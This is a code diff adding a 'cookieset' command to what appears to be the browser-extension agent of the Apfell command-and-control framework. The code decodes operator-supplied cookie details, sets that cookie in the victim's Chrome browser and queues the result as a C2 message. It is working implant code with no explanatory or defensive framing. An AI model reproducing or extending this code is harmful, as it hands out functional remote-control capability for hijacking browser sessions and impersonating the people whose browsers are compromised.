@@ -1,0 +1,22 @@
+cookieset = function() {
+    let details = JSON.parse(atob(data['data'].toString()));
+
+    chrome.cookies.set(details, function(cookie){
+        let resp;
+        if (cookie === null) {
+            resp = JSON.stringify(chrome.runtime.lastError);
+        } else {
+            resp = JSON.stringify(cookie);
+        }
+
+        const data = btoa(unescape(encodeURIComponent(resp)));
+        const apfellMsg = CreateApfellMessage(2, config.apfellID, config.UUID, data.length, taskid, tasktype, data);
+        let meta = {};
+        meta["metatype"] = 3;
+        meta["metadata"] = apfellMsg;
+        const metaenvelope = JSON.stringify(meta);
+        out.push(metaenvelope);
+    });
+};
+
+C2.commands[cookieset.name] = cookieset;
